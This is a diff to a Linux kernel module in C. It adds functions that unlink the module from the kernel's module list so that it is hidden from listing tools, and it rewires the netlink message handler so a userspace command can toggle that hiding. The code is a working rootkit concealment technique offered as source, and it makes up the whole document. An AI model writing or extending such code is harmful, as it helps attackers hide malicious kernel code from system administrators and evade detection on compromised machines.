@@ -18,6 +18,39 @@ MODULE_VERSION(VERSION);
 
 
 /***********************************************************
+*          CONFIGURE MODULE                                *
+***********************************************************/
+
+static struct list_head *prev_save;
+
+static void hidemodule(void) {
+    if (prev_save) return;
+    prev_save = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+static void showmodule(void) {
+    if (!prev_save) return;
+    list_add(&THIS_MODULE->list, prev_save);
+}
+
+static char * configure(const char * command) {
+    if (strcmp(command, "hidemodule") == 0) {
+        hidemodule();
+        return "Module is now hidden.";
+    }
+    if (strcmp(command, "showmodule") == 0) {
+        showmodule();
+        return "Module is now shown.";
+    }
+    return "Error: unknowm command!";
+}
+
+
+
+
+
+/***********************************************************
 *          NETLINK COMMUNICATION                           *
 ***********************************************************/
 
@@ -58,7 +91,7 @@ static void nl_recv_msg(struct sk_buff * skb) {
     printk(KERN_INFO "Received: %s (%ld Bytes)\n", msg, strlen(msg));
 
     // prepare response data
-    msg = "Hello User!";
+    msg = configure(msg);
     msg_len = strlen(msg);
 
     // allocate space for message
